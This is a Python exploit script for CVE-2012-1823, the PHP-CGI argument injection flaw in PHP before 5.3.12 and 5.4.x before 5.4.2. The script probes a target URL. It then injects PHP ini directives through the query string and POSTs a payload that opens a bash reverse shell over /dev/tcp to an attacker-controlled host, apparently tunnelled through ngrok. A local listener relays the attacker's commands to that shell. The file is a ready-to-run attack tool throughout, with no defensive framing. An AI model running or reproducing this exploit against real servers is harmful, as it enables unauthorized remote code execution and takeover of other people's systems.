# php < 5.3.12
# php 5.4.x < 5.4.2

# Regex:
# ^5\.(?:0|1|2)\.\d+$|^5\.3\.(0|[1-9]|10|11)$|^5\.4\.[01]$


# Remote Code Execution



import requests
import argparse
import sys
import threading
import socket
import select



# Simple check with basic param 
def Vulnerable_Check(url, header):  
    U = url + "?-s"  
    try:
        response = requests.get(U, headers=header)
        
        if response.status_code == 200:
            print("[+] Detected Vulnerability : True\n")
        else:
            print("[-] Detected Vulnerability : False")
            sys.exit()       
    except requests.RequestException:
            print("(!) Error Occured in Checking Vulnerable")
            sys.exit()

# Setting server listening on attacker side 
def start_listening(fport):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server_socket.bind(("0.0.0.0", int(fport)))
        server_socket.listen(1)
        client_socket, addr = server_socket.accept()
        client_socket.setblocking(0)
        print("Receive Shell Success!!")
        print("\nPut your command:")
        inputs = [sys.stdin, client_socket]
        outputs = [client_socket]

        while True:
            readable, writable, exceptional = select.select(inputs, outputs, inputs)
            for s in readable:
                if s is client_socket:
                    response = s.recv(4096)
                    if not response:
                        return                    
                    print(response.decode(errors="replace").strip())
                    print("-"*100)
                else:
                    command = s.readline().strip()
                    if command:
                        client_socket.send(command.encode() + b"\n")

            for s in exceptional:
                return

    finally:
        if server_socket:
            server_socket.close()
        if client_socket:
            client_socket.close()
            
parser = argparse.ArgumentParser(usage="""CVE-2012-1823.py -u https://*.*.*.*/index.php -lp 14143 -lh 0.tcp.jp.ngrok.io -fp 4444""")
parser.add_argument('--URL', '-u', help='Target URL', required=True)
parser.add_argument('--lhost', '-lh', help='Local host for reverse shell', required=False)
parser.add_argument('--lport', '-lp', help='Local port for reverse shell', required=False)
parser.add_argument('--fport', '-fp', help='Forward port through ngrok', required=False)
args = parser.parse_args()

url = args.URL.rstrip('/')
header = {'Content-Type': 'application/x-www-form-urlencoded'}



Vulnerable_Check(url, header)

if args.lhost and args.lport and args.fport:       
    # Vulnerable endpoint 
    attack_dir = "?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input"

    target = url + attack_dir

    # Server listening start
    listen_thread = threading.Thread(target=start_listening, args=(args.fport,))
    listen_thread.start()

    # Connection from vulnerable server to attcker server with bash script 
    attack_body = f"<?php system(\"bash -c '0<&120-;exec 120<>/dev/tcp/{args.lhost}/{args.lport};sh <&120 >&120 2>&120'\"); ?>"
    requests.post(target, headers=header, data=attack_body)

else:
    print("Check your arguments")
